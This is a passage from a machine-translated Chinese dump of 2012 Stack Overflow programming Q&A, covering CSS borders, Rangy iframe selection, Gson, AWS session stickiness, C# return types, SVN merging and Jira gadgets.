    background:url(border_tr.png);
    position:absolute;
    top:-2px; right:-5px;
    width:5px;
    height:2px;
}
.border_tl {
    background:url(border_tl.png);
    position:absolute;
    top:-2px; left:-2px;
    width:2px;
    height:2px;
}
-->
</style> 
```

如您所见，它可能不是最佳解决方案。 ***但是有更好的方法吗？***

***更新：***大多数浏览器和版本都支持阴影，即使它不是一种标准。使用 css-shadow 的来源：http: [//pastebin.com/LZHUQRW9](http://pastebin.com/LZHUQRW9) *但我的问题不仅与阴影有关。*

***完整源代码：*** [http: //pastebin.com/wxFS2PHr](http://pastebin.com/wxFS2PHr)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:58:38.070

看看[http://css3pie.com](http://css3pie.com)

这将允许您在旧版浏览器中使用 CSS 3 元素，并有望帮助您保持标记更清晰。

您还可以包含一些额外的逻辑，这些逻辑将为支持它的浏览器使用 CSS 3，并为其他浏览器恢复为 CSS Pie 功能。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:44:13.123

你可以尝试这样的事情：[http ://robertnyman.com/2010/03/16/drop-shadow-with-css-for-all-web-browsers/](http://robertnyman.com/2010/03/16/drop-shadow-with-css-for-all-web-browsers/)

我认为还有更多的库——JavaScript、.htc 等等……——来实现同样的目标。

**编辑：**我认为您不会使用 8 张不同的图片。但是您可以编写一个 javascript 来动态添加所需的 DIV，例如为每个具有类边框的 DIV。

这将清理您的 HTML 标记 - 但 DOM 仍然很复杂..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-08T18:29:50.390

也许[这篇关于 css-tricks](http://css-tricks.com/understanding-border-image/) using的文章`border-image`是您正在寻找的？它链接到的[交互式演示](http://www.norabrowndesign.com/css-experiments/border-image-anim.html)似乎可以满足您的要求。

当然这个解决方案只在支持[css3 border-image](http://www.w3.org/TR/css3-background/#border-images)的浏览器中可用。上面的演示确实适用于 FF 和 Chrome，但不适用于 IE9。根据[Modernizr 文档](http://modernizr.com/docs/#features-css)，它可以用来添加对 的支持`border-image`，但我自己没有尝试过。如果那行得通，那么这将为您提供一个相对干净的解决方案。

# javascript - 使用 Rangy 从 IFRAME 获取选定的文本

> ID：10499763
> 
> 赞同：1
> 
> 时间：2012-05-08T13:39:22.223
> 
> 标签：javascript, asp.net, rangy

我正在尝试使用此功能使用 Rangy 获取 Iframe 的选定文本；

```
function getSelectedText() {
   var iframe = document.getElementById("CustomeHTMLViewer");
   var iframeWin = iframe.contentDocument ? iframe.contentDocument.defaultView : iframe.contentWindow;
   var sel = rangy.getSelection(iframeWin);
   return sel;
} 
```

**此代码不起作用；如何获取 iframe 的选定文本？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:56:20.287

Rangy 有一个方便的方法：`rangy.getIframeSelection()`. 例子：

```
var iframe = document.getElementById("CustomeHTMLViewer");
var sel = rangy.getIframeSelection(iframe); 
```

要获取所选文本，请调用所选内容`toString()`：

```
var selectedText = sel.toString();
alert(selectedText); 
```

Rangy 允许将 iframe 元素直接传递到`rangy.getSelection()`.

说了这么多，您的原始代码实际上似乎没有任何问题。

# visual-studio-2010 - Microsoft Visual Studio Express C++ 2010 是否具有安装程序制造商功能？

> ID：10499764
> 
> 赞同：1
> 
> 时间：2012-05-08T13:39:28.473
> 
> 标签：visual-studio-2010, visual-c++, installation

我才开始使用 Visual Studio Express C++ 2010（更熟悉 *nix 平台上的 Autotools）并且仍在探索菜单项，但我想从知道是否使用的人那里得到答案免费版本可以为他们的程序制作 .msi 安装程序。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:58:48.643

对不起，你[不走运](http://msdn.microsoft.com/en-us/library/2kt85ked.aspx)：

> Express Edition 不包含 Windows Installer 技术

但是，您应该能够通过[Platform SDK](http://msdn.microsoft.com/en-us/library/windows/desktop/aa370834%28v=vs.85%29.aspx)免费获得此功能。

# facebook - 如何在 Facebook 上将网站列入白名单？

> ID：10499767
> 
> 赞同：1
> 
> 时间：2012-05-08T13:39:40.243
> 
> 标签：facebook, web, whitelist, sense

最近，Facebook 与 Websense 联手过滤恶意网站。我们网站上的一位用户收到了这条消息 - “与 Websense 合作，帮助保护您的在线安全。您尝试访问的链接已被我们信任的合作伙伴识别为可能不安全。” 这是一个非常重要的网站，上面的信息对我来说似乎很奇怪。

我试图找到将这个网站列入白名单的方法，但没有成功。如何在 Facebook 上将此网站列入白名单？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:51:48.223

您可能已经看过这个，但以防万一您还没有

[http://www.websense.com/content/support/library/web/v76/filter_faqs/filter_faq_whitelist.aspx](http://www.websense.com/content/support/library/web/v76/filter_faqs/filter_faq_whitelist.aspx)

# iphone - 是否有任何可以由 App 控制的 iphone/ipad 相机硬件过滤器？

> ID：10499769
> 
> 赞同：3
> 
> 时间：2012-05-08T13:39:45.117
> 
> 标签：iphone, xcode, ipad, camera, hardware

我在 apple.stackexchange 上发布[了同样的问题](https://apple.stackexchange.com/questions/50725/are-there-any-camera-hardware-filters-that-can-be-controlled-by-an-app/50726#50726)......也许在这里它更适合。

有谁知道在 iPhone（任何版本）中是否有任何可以通过软件控制的相机/CCD 硬件滤光片（例如偏光滤光片、红外滤光片、带通滤光片）？

如果是这样，我该怎么做和/或在哪里可以找到有关它的文档？我已经使用 XCode 编写了一个 iPad 应用程序，所以我并不完全是新手。

谢谢你的帮助。

* * *

**编辑**

我正在尝试开发一个应用程序，所以我假设设备或相机**没有连接外部硬件/过滤器**，只有带有标准硬件的 iPhone/iPad。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:54:07.090

查看 CIFilter 类引用，这可用于实现您的目标。有许多不同的过滤器可用，我相信它们可以实时应用，或者至少在几毫秒内实时应用。

[https://developer.apple.com/library/mac/#documentation/graphicsimaging/Reference/QuartzCoreFramework/Classes/CIFilter_Class/Reference/Reference.html](https://developer.apple.com/library/mac/#documentation/graphicsimaging/Reference/QuartzCoreFramework/Classes/CIFilter_Class/Reference/Reference.html)

具体来说，可以在此处找到所有可用 CIFilter 的列表。

[http://developer.apple.com/library/mac/#documentation/graphicsimaging/reference/CoreImageFilterReference/Reference/reference.html](http://developer.apple.com/library/mac/#documentation/graphicsimaging/reference/CoreImageFilterReference/Reference/reference.html)

# c#-4.0 - 使用 c++/cli 访问 xlsx 工作表

> ID：10499771
> 
> 赞同：0
> 
> 时间：2012-05-08T13:39:48.027
> 
> 标签：c#-4.0, c++-cli, excel-2007

我想在我的 c++ 应用程序 c++/cli 应用程序中实现如下所示的内容。我正在使用视觉工作室 2010。

```
static void ReadExcelFileDOM(string fileName)
{
    using (SpreadsheetDocument spreadsheetDocument = SpreadsheetDocument.Open(fileName, false))
    {
        WorkbookPart workbookPart = spreadsheetDocument.WorkbookPart;
        WorksheetPart worksheetPart = workbookPart.WorksheetParts.First();
        SheetData sheetData = worksheetPart.Worksheet.Elements<SheetData>().First();
        string text;
        foreach (Row r in sheetData.Elements<Row>())
        {
            foreach (Cell c in r.Elements<Cell>())
            {
                text = c.CellValue.Text;
                Console.Write(text + " ");
            }
        }
        Console.WriteLine();
        Console.ReadKey();
    }
} 
```

我进行如下：

```
#include "stdafx.h"
#define S DocumentFormat::OpenXml::Spreadsheet::Sheets
#define Sheetdata DocumentFormat::OpenXml::Spreadsheet::SheetData
#define Wsheet DocumentFormat::OpenXml::Spreadsheet::WorkbookPart::WorksheetPart
#define E DocumentFormat::OpenXml::OpenXmlElement
#define As DocumentFormat::OpenXml::OpenXmlAttributes
#define A DocumentFormat::OpenXml::OpenXmlAttribute
using namespace System;
using namespace System::Collections::Generic;
using namespace System::Linq;
using namespace System::IO;
using namespace System::Text;
using namespace System::Diagnostics;
using namespace DocumentFormat::OpenXml;
using namespace DocumentFormat::OpenXml::Packaging;
using namespace DocumentFormat::OpenXml::Spreadsheet;
int _tmain(int argc, _TCHAR* argv[])
{
    DocumentFormat::OpenXml::Packaging::SpreadsheetDocument^ mySpreadsheet = SpreadsheetDocument::Open("sample.xlsx", false);
    WorkbookPart^ wp = mySpreadsheet->WorkbookPart;//
    IEnumerable<Sheet>^ sheets = wp->GetFirstChild<Sheet>().Elements<Sheet>();

    return 0;
} 
```

构建失败并出现以下错误：

```
1>clitest.cpp(33): error C3225: generic type argument for 'T' cannot be 'DocumentFormat::OpenXml::Spreadsheet::Sheet', it must be a value type or a handle to a reference type
1>clitest.cpp(33): error C2039: 'GetFirstChild' : is not a member of 'DocumentFormat::OpenXml::Packaging::WorkbookPart'
1>          c:\program files (x86)\open xml sdk\v2.0\lib\documentformat.openxml.dll : see declaration of 'DocumentFormat::OpenXml::Packaging::WorkbookPart'
1>clitest.cpp(33): error C2059: syntax error : ')' 
```

请如果有人可以帮助我。我对这个问题持保留态度。

关于 **强文本**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T13:45:08.240

泛型类型需要是类引用类型。

```
IEnumerable<Sheet^> 
```

# jquery - 获取当前列表顺序的最佳方法是什么？

> ID：10499776
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:06.810
> 
> 标签：jquery, html, jquery-ui

我正在使用 jquery ui draggable 并允许用户更改列表的顺序，当他们完成后我计划让他们单击一个按钮，我将使用他们当前的列表顺序创建一个 json 文件，最好的方法是什么使用 jquery 做这样的事情，因为列表顺序没有写在 html 文件上？

ps：每个`li`标签和`ul`标签都可能有一个id。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:44:39.800

您可以使用

```
jQuery(myListItemSelector).each(function(index, item){
    // Do something here...
}) 
```

循环遍历将 ID、属性或内容提取到 JSON 列表中的项目。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T14:00:57.447

扩展金的答案。如果您不能保证每个项目都有一个 id 并且因为您使用的是 jQuery。您应该使用[jQuery.data()](http://api.jquery.com/jQuery.data/)或[jQuery data()](http://api.jquery.com/data/)将上下文附加到项目，以便您知道哪个是哪个。如果该上下文只是原始顺序，它将看起来像这样。

```
jQuery(myListItemSelector).each(function(index, item){
    // Do something here...
    jQuery(this).data("index", index);
}); 
```

然后，当您保存它时，您可以再次循环并拉出该索引值。如果有一些其他定义值可以使这些值变得独一无二，那么它比索引更容易。在这种情况下，像 GUID 这样的东西真的很方便。

# testing - FQL 测试工具消失了？

> ID：10499777
> 
> 赞同：2
> 
> 时间：2012-05-08T13:40:10.110
> 
> 标签：testing, facebook-fql

这是我在这里的第一篇文章，所以我应该首先感谢您帮助我解决的无数问题。

[http://developers.facebook.com/docs/reference/rest/fql.query/](http://developers.facebook.com/docs/reference/rest/fql.query/)

fql.query 页面有一个实用程序，允许您构建 FQL 语句并使用您的一个应用程序访问令牌测试它们的结果。只是我还是消失了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T14:34:52.123

您现在使用[Graph API Explorer](https://developers.facebook.com/tools/explorer)工具来测试所有内容。

在大对话框中，您键入`fql?q=`后跟您的查询。例如：`fql?q=SELECT username FROM user WHERE uid = me()`

还有其他按钮可让您使用自定义访问令牌或页面的令牌方法之一。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-28T03:16:04.297

同意 cpilko，使用 Graph API Explorer。

您可以将此链接添加为书签，它会自动将选项卡切换到 FQL [https://developers.facebook.com/tools/explorer?fql](https://developers.facebook.com/tools/explorer?fql)

# java - Gson JsonObject 全局变量

> ID：10499780
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:17.177
> 
> 标签：java, json, gson

> **可能重复：**
> [Gson JsonObject 全局变量](https://stackoverflow.com/questions/10499846/gson-jsonobject-global-variable)

我正在使用 Gson API 并创建了一个类，如：

```
public class Person
{
   private String name;
   private JsonObject someInfo;

   public Person(String name, String someInfo)
   {
      this.name = name;
      this.someInfo = someInfoM
   }
} 
```

当我使用以下方法重新实现此类的实例时：

```
Person person = new Person("Charles", "{\"key1\":\"value1\"}");
Gson gson = new Gson();
String jsonStr = gson.toJson(person); 
```

我在成员属性中获取信息：

```
{"members":"{"name":"Charles",{"key1","value1"}}"} 
```

我注意到，如果我将 Person 的类 someInfo 全局变量声明为 JsonElement 而不是 JsonObject，则信息将正确显示。

有什么方法可以使用 JsonObject 来实现信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T22:08:15.197

升级到[Gson 2.2](http://code.google.com/p/google-gson/downloads/list)。Gson 从 2.0 开始只支持序列化 JsonObject 等。

# linux - 内核升级后apt-get自动提示消失

> ID：10499783
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:34.120
> 
> 标签：linux, bash, ssh, kernel, vps

我有一些关于 bash 的问题。

在今天之前，我的 VPS（Ubuntu 12.04 LTS）使用的是内核 2.x。（因为它是从 11.04 升级的，并且引导选项没有得到更新。）

今天我想使用内核 3.2 作为默认内核。

修改 grub 配置后，我已经在内核 3.2 中成功启动了 VPS。使用`uname -r`将显示`3.2.0-24-generic`而不是`2.x.y-z-generic`现在。

但是，发生了一些奇怪的事情，我不知道为什么。

在内核更改之前，如果我输入一些未知的命令，shell 会提示我使用 apt-get 来安装它。比如我没有`bind9`安装，当我尝试运行时`named`，会出现这样的提示：

```
wzyboy@vermilion:~$ 命名
当前未安装“命名”程序。您可以通过键入以下内容来安装它：
sudo apt-get install bind9
```

有时当我打错字时，我会得到纠正（“你的意思是”）：

```
wzyboy@vermilion:~$ 命名
找不到命令“namedd”，您的意思是：
 来自包“bind9”（主）的命令“命名”
命名：找不到命令
```

但是，在内核更改后，当我尝试运行`named`时，shell 只是说：

```
wzyboy@natatio:/$ 命名
-bash：命名：找不到命令
```

我认为bash可能有问题，但我不知道如何解决这个问题。有人可以帮忙吗？

[已解决] 谢谢！安装`command-not-found`包后，问题解决。但是，我仍然不明白为什么在更改内核后包丢失了......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:41:09.000

要启用这些自动建议，您需要确保已安装*command-not-found*。如果安装正确，它通常会通过*/etc/bash.bashrc自动启用。*

# matlab - 使用drawow：评估uicontrol回调时中断

> ID：10499785
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:39.720
> 
> 标签：matlab, callback, while-loop, switch-statement

我在 switch-case 语句中的 while 循环有问题，与回调函数和“drawnow”一起使用。在我的代码中，虽然 switch-case 的情况由 uicontrol 中的按钮确定，但 case 语句涉及进一步的回调函数，以使用“windowbuttondown/up/motionfcn”跟踪鼠标移动。但是，因为我在 case 语句的 while 循环内绘制了多个绘图，所以我使用了“drawnow”，这在我运行程序时给了我以下错误：

第 160 行错误 ==>drawow ??? 评估 uicontrol 回调时中断

当我独立运行时，case 语句中的这段代码没有出错，但在与其余代码集成时会以某种方式产生问题，我附在下面。任何帮助将不胜感激。非常感谢！

```
function programme(selection)

if nargin == 0 
selection=0
end

switch selection
case 0 %start GUI and uicontrols to set up the cases i.e programme(1), programme(2) etc         
    uicontrol('style','pushbutton',...
        'string','First', ...
        'position',[50 700 50 20], ...
        'callback','programme(1);');
    uicontrol('style','pushbutton',...
        'string','Second', ...
        'position',[150 700 50 20], ...
        'callback','programme(2);');

case 1

    %mouse track:
    set(gcf,'windowbuttondownfcn','mousedown=1;');
    set(gcf,'windowbuttonupfcn','mouseup=1;');
    set(gcf,'windowbuttonmotionfcn','mousemotion=1;');

    %to terminate the while loop, set up stopit=1 on one of uicontrol buttons:   
    uicontrol('style','pushbutton',...
        'string','First', ...
        'position',[50 700 50 20], ...
        'callback','stopit=1;');

    stopit=0;

    while (stopit==0)
        if mousedown==1
            statements   
            if mouseup ==1
                statements (plots)
                mouseup=0;
                mousedown=0;
                mousedown=0;
            end
        end
        drawnow
    end

case 2
    statements
otherwise
    statements 
```

结尾

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:18:18.927

看帮助：[drawow](http://www.mathworks.de/help/techdoc/ref/drawnow.html) 它会中断回调。你在回调中调用你的函数。也许您可以将其替换为`pause(0.01)`.

尽管我强烈建议您摆脱循环并改用回调。

# amazon-ec2 - Amazon Web Services 上的会话粘性

> ID：10499789
> 
> 赞同：17
> 
> 时间：2012-05-08T13:40:52.173
> 
> 标签：amazon-ec2, amazon-web-services, amazon-elastic-beanstalk, amazon-elb

我对在 Amazon Web Services 上使用会话粘性感到有点困惑。当我使用 Amazon Elastic Beanstalk 部署我的 java Web 应用程序时，我可以选择启用会话粘性，然后指定一个 cookie 过期时间。

我的应用程序将 cookie 用于会话 (JSESSIONID) 以及其他小事。大多数网站只有在登录后才能访问（我使用 Spring security 来管理它）。该网站将在多达 25 个小型 EC2 实例上运行。

我应该启用会话粘性吗？如果我不启用它，是否意味着我可能会因为负载均衡器将我带到另一台服务器（而不是对我进行身份验证的服务器）而突然注销？如果我启用会话粘性，当验证我的服务器关闭时，我是否会被注销？基本上，为什么以及何时应该使用会话粘性？

非常感谢。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-05-08T15:56:10.057

> 如果我不启用它，是否意味着我可能会因为负载均衡器将我带到另一台服务器（而不是对我进行身份验证的服务器）而突然注销？

是的

> 如果我启用会话粘性，当验证我的服务器关闭时，我是否会被注销？

是的

在将 Elastic Beanstalk 与典型的 Java Web 应用程序一起使用时，我认为您肯定会希望启用会话粘性。否则，来自用户浏览器的每个 HTTP 请求都可能被路由到不同的服务器。

为了解决当他们“卡住”的服务器关闭时用户会话被破坏的问题，您需要查看[Tomcat session replication](http://tomcat.apache.org/tomcat-7.0-doc/cluster-howto.html)。不幸的是，这不是 Elastic Beanstalk 开箱即用的东西，因此为了设置会话复制，您必须创建一个自定义 Elastic Beanstalk AMI 供您的应用程序使用。此外，您必须使用[不依赖多播的 Tomcat 会话复制的实现](https://forums.aws.amazon.com/thread.jspa?threadID=21554)，因为多播在 AWS 或我知道的任何其他云环境上不可用。不依赖多播的实施示例是使用数据库（例如 Amazon RDS）或 memcached 服务器（例如 Amazon Elastic Cache）使会话在多个 Tomcat 实例之间可用。

另请注意，Elastic Beanstalk UI 仅允许您启用负载均衡器生成的 HTTP cookie。但是，在 Elastic Beanstalk 创建负载均衡器之后，您可以进入 EC2 控制台并修改负载均衡器的设置以将其切换为应用程序生成的 HTTP cookie，然后告诉它使用“JSESSIONID”cookie。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-03-18T09:26:55.330

您还可以使用 DynamoDB 进行 tomcat 会话共享：[http ://docs.aws.amazon.com/AWSSdkDocsJava/latest/DeveloperGuide/java-dg-tomcat-session-manager.html](http://docs.aws.amazon.com/AWSSdkDocsJava/latest/DeveloperGuide/java-dg-tomcat-session-manager.html)

# c# - C#中方法的变量返回类型

> ID：10499791
> 
> 赞同：11
> 
> 时间：2012-05-08T13:40:55.960
> 
> 标签：c#, multiple-variable-return

我想给一个方法一个参数，我希望我的方法通过查看参数来返回数据。数据可以是布尔、字符串、整数等类型。如何从方法中返回变量类型？我不想返回一个对象类型，然后将其转换为另一种类型。例如：

```
BlaBla VariableReturnExampleMethod(int a)
{
    if (a == 1)
        return "Demo";
    else if (a == 2)
        return 2;
    else if (a == 3)
        return True;
    else
        return null;
} 
```

我想要这样做的原因是我有一种方法可以从数据库中读取一行的选定列。列的类型不一样，但我必须返回每一列的信息。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-08T13:42:37.153

> 如何从方法返回变量类型？我不想返回一个对象类型，然后将其转换为另一种类型。

嗯，这基本上就是你*必须*做的。或者，如果您使用 C# 4，您可以设置返回类型`dynamic`，这将允许隐式转换：

```
dynamic VariableReturnExampleMethod(int a)
{
    // Body as per question
}

...

// Fine...
int x = VariableReturnExampleMethod(2);

// This will throw an exception at execution time
int y = VariableReturnExampleMethod(1); 
```

从根本上说，您指定类型以让*编译器*知道会发生什么。如果仅在*执行*时知道类型，那如何工作？该`dynamic`版本有效的原因是它基本上告诉编译器将其正常工作推迟*到*执行时间 - 所以你失去了正常的安全性，这会让第二个示例在编译时失败。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T13:44:33.950

如果您的目标是关键字，请使用`dynamic`关键字代替，但`BlahBlah`如果您的目标`.Net 4.0`较小，那么`object`这是您最安全的选择，因为它是您能想到的所有其他类的基类。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-08T13:45:16.637

听起来这对于[泛型](http://msdn.microsoft.com/en-us/library/512aeb7t%28v=vs.100%29.aspx)来说可能是一个很好的例子。如果您知道调用它时所期望的数据类型，则可以调用该函数的特定通用版本。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-08T13:47:20.037

考虑使用类似 Dapper-dot-net（由 Marc Gravell 和 Sam Saffron 在我们自己的 Stack Overflow 上编写）之类的东西从数据库中提取内容。它为您处理数据库到对象的映射。

此外，如果您不想使用工具，并且您正在从数据库中提取数据，并且您在编译时知道各个列的数据类型（就像听起来一样），那么您可能应该在工作行-逐行而不是逐列。

```
//Pseudo-code:
List<DatabaseObject> objects = new List<DatabaseObject>();
foreach(var row in DatabaseRows)
{
    var toAdd = new DatabaseObject();
    toAdd.StringTypeVariable = "Demo";
    toAdd.IntTypeVariable = 2;
    toAdd.BoolTypeVariable = true;
    object.Add(toAdd);
} 
```

注意：您可以在此处使用对象初始化器语法和 linq，但这是我可以想到的最基本的演示方式，而无需使用大量额外的东西。

另请注意，这里我假设您*实际上并不*想返回“Demo”、2 和 true，而是使用该行的值。这只是意味着您将硬编码值更改为：`row.GetStringType(stringColumnIdx)`或类似的东西。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-08T13:45:12.290

使用返回类型 as `object`，那么您可以获得任何返回类型。您必须通过反射或其他方法处理返回类型 ether。

检查这个：

```
void Main()
{
    object aa = VariableReturnExampleMethod(3);
    Console.WriteLine(aa.ToString());
}

object VariableReturnExampleMethod(int a)
{
    if (a == 1)
        return "Demo";
    else if (a == 2)
        return 2;
    else if (a == 3)
        return true;
    else
        return null;
} 
```

编辑：我赞成强类型对象，您可以在 .net 平台上轻松实现它。

```
if(returnedValue !=null)
{

string currentDataType = returnedValue.GetType().Name;
object valueObj = GetValueByValidating(currentDataType, stringValue);
}

 public object GetValueByValidating(string strCurrentDatatype, object valueObj)
        {
            if (valueObj != "")
            {
                if (strCurrentDatatype.ToLower().Contains("int"))
                {
                    valueObj = Convert.ToInt32(valueObj);
                }
                else if (strCurrentDatatype.ToLower().Contains("decimal"))
                {
                    valueObj = Convert.ToDecimal(valueObj);
                }
                else if (strCurrentDatatype.ToLower().Contains("double") || strCurrentDatatype.ToLower().Contains("real"))
                {
                    valueObj = Convert.ToDouble(valueObj);
                }
                else if (strCurrentDatatype.ToLower().Contains("string"))
                {
                    valueObj = Convert.ToString(valueObj);
                }
                else
                {
                    valueObj = valueObj.ToString();
                }
            }
            else
            {
                valueObj = null;
            }
            return valueObj;
        } 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-23T08:21:30.357

我看看你的问题，一个比第二个好，但最后我必须重写以更好地理解解决方案。这个解决方案跳过了很长的 if else stack 并在 Types 枚举上用 foreach 替换它，在那里我们可以实现我们需要的所有类型。我更喜欢使用动态，但这也可以使用。

主函数`GetValueByValidating`返回值如果是类型定义并且可能，在其他情况下返回 false 看**niranjan-kala**这是你重写后的主函数。

```
 /// 
        /// Enum of wanted types
        /// 
        public enum Types
        {
            [ExtendetFlags("int")]
            INT,
            [ExtendetFlags("decimal")]
            DECIMAL,
            [ExtendetFlags("double")]
            DOUBLE,
            [ExtendetFlags("real")]
            REAL,
            [ExtendetFlags("string")]
            STRING,
            [ExtendetFlags("object")]
            OBJECT,
            [ExtendetFlags("null")]
            NULLABLE
        }
        /// 
        /// Cycle by types when in enum exist string reference on type (helper)
        /// 
        /// 
        /// 
        public static Types GetCurrentType(string container)
        {
            foreach (Types t in Enum.GetValues(typeof(Types)))
            {
                if (container.Contains(t.GetFlagValue()))
                {
                    return t;
                }
            }
            return Types.NULLABLE;
        }
        /// 
        /// Return object converted to type
        /// 
        /// 
        /// 
        /// 
        public static object GetValueByValidating(string strCurrentDatatype, object valueObj)
        {
            var _value = valueObj != null ? valueObj : null;
            try
            {
                Types _current = _value != null ? GetCurrentType(strCurrentDatatype.ToLower()) : Types.NULLABLE;

                switch (_current)
                {
                    case Types.INT:
                        valueObj = Convert.ToInt32(valueObj);
                        break;
                    case Types.DECIMAL:
                        valueObj = Convert.ToDecimal(valueObj);
                        break;
                    case Types.DOUBLE:
                        valueObj = Convert.ToDouble(valueObj);
                        break;
                    case Types.REAL:
                        valueObj = Convert.ToDouble(valueObj);
                        break;
                    case Types.STRING:
                        valueObj = Convert.ToString(valueObj);
                        break;
                    case Types.OBJECT:
                        break;
                    case Types.NULLABLE:
                        throw new InvalidCastException("Type not handled before selecting, function crashed by retype var.");
                }
            } catch (InvalidCastException ex)
            {
                Log.WriteException(ex);
                valueObj = false;
            }

            return valueObj;
        } 
```

# svn - 兄弟分支之间的SVN合并

> ID：10499792
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:57.527
> 
> 标签：svn, merge

在 SVN 中，我有两个分支，1.0 和 2.0。如果我在 1.0 中修复了一个问题，如何将该修复合并到 2.0 中，反之亦然？

考虑以下场景：

1.  我对 1.0 分支进行了修复，它创建了一个新文件 A (rev X)。
2.  我做了一个简单的合并，只是从 1.0 到 2.0 (rev X+1)
3.  然后我对 2.0 分支进行了修复，它修改了 A (rev Y)。
4.  如果我将该修复合并回 1.0，我会遇到合并冲突！

我想我总是可以强制先在 1.0 分支上进行修复，或者我可以手动阻止 1.0 分支上的 X+1 修订。这两个都不理想，我想知道是否有更好的方法来处理兄弟分支。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-10T13:11:10.630

“最佳”方式将取决于您分支机构的目的。

例如，如果分支 1.0 用于错误修复，分支 2.0 用于测试，那么首先对 1.0 进行所有修复，然后推送到 2.0 是有意义的。

如果它们是不同的项目，并且您想挑选哪些功能在分支之间合并，那么您可以使用主干作为中心点。

如果两个分支都将具有相同的文件和更改并且都不是权威的，那么你真的需要两者吗？

最终，如果两个分支都涉及对同一个文件进行更改，那么您将遇到冲突，这取决于您的情况，即哪种日常处理更容易。

# jira - Jira 小工具配置屏幕的问题

> ID：10499793
> 
> 赞同：0
> 
> 时间：2012-05-08T13:40:58.227
> 
> 标签：jira, jira-plugin

在为 Jira 编写小工具时，我不断遇到奇怪的问题。我遇到了一些问题，比如选项被剪掉了，重新配置不起作用，最烦人的是：projectOrFilterPicker 不起作用。

我遇到的大多数奇怪问题都可以解决，这就是我所做的，但是我需要允许用户使用该快速搜索框来选择项目或过滤器。但是，只要我包含其中一个对话框，小工具就会无休止地加载，如果我调整屏幕大小（我用于其他事情的解决方法之一），我会收到错误 500。

奇怪的是，它在 Atlassian SDK 测试 Jira (V 4.4) 上本地工作，但在我的工作场所完整测试服务器 (V 2.1.3) 上不工作。

这是我正在使用的一些代码，如有必要，我可以发布更多代码：

```
var projectPicker = AJS.gadget.fields.projectOrFilterPicker(gadget, "projectId", args.projectOptions); 
```

args.projectOptions 在这里定义：

```
args: function()
{

    return [
        {
        key: "projectOptions",
        ajaxOptions:  "/rest/gadget/1.0/filtersAndProjects" 
    }
    ];
}() 
```

任何见解/建议将不胜感激。提前致谢。

卡尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-09T09:44:55.660

我将以下代码添加到小工具 javascript 的顶部：

```
<link type="text/css" rel="stylesheet" href="http://iedev255/s/531/4/1.0/_/download/batch/jira.webresources:autocomplete/jira.webresources:autocomplete.css" media="all">
<link type="text/css" rel="stylesheet" href="http://iedev255/s/531/4/4.1.2/_/download/batch/com.atlassian.jira.gadgets:common/com.atlassian.jira.gadgets:common.css" media="all">
<link type="text/css" rel="stylesheet" href="http://iedev255/s/531/4/4.1.2/_/download/resources/com.atlassian.jira.gadgets:common/global.css" media="all">
<script type="text/javascript" src="http://iedev255/s/531/4/2.1.3/_/download/batch/com.atlassian.auiplugin:ajs/com.atlassian.auiplugin:ajs.js" ></script>
<script type="text/javascript" src="http://iedev255/s/531/4/1.0/_/download/batch/jira.webresources:jira-global/jira.webresources:jira-global.js" ></script>
<script type="text/javascript" src="http://iedev255/s/531/4/1.0/_/download/batch/jira.webresources:autocomplete/jira.webresources:autocomplete.js" ></script>
<script type="text/javascript" src="http://iedev255/s/531/4/4.1.2/_/download/batch/com.atlassian.jira.gadgets:common/com.atlassian.jira.gadgets:common.js" ></script> 
```

解决了我的很多问题

# javascript - JavaScript 变量带有我需要在 Html.ActionLink 中使用的 ID

> ID：10499797
> 
> 赞同：3
> 
> 时间：2012-05-08T13:41:32.857
> 
> 标签：javascript, jquery, asp.net-mvc, razor, html-helper

我的 jQuery 代码中有一个 JavaScript 变量，其中包含我需要在其中使用的 ID，`Html.ActionLink`但它不起作用：

```
@(Html.ActionLink("Genomför", "AnswerForm", "AnswerNKI", new {id = goalcard.Id},null)) 
```

我得到：'无法解析符号“目标卡”'，原因是目标卡是一个 JavaScript 变量。

这是它的样子：

```
$.post('@Url.Action("Search", "SearchNKI")', data, function (result) {
    $("#GoalcardSearchResult tbody").empty();
    result.forEach(function(goalcard) {
        $("#GoalcardSearchResult tbody").append(
            $('<tr/>', {
            // steg Create a row for each result 
                html: "<td>" + goalcard.Name +
                "</td><td>" + goalcard.Customer +
                "</td><td>" + goalcard.PlannedDate +
                "</td><td>" + goalcard.CompletedDate +
                "</td><td>" + '@(Html.ActionLink("Genomför", "AnswerForm", "AnswerNKI", new {id = goalcard.Id},null))' + "</td>"
        }));
    });
}); 
```

我已经测试了一段时间，我几乎找到了一个解决方案，它看起来像这样：

```
@(Html.ActionLink("Genomför", "AnswerForm", "AnswerNKI",null, new {id = "mylink"})) 
```

然后我做了一个新功能：

```
$('#mylink').click(function (goalcard) {
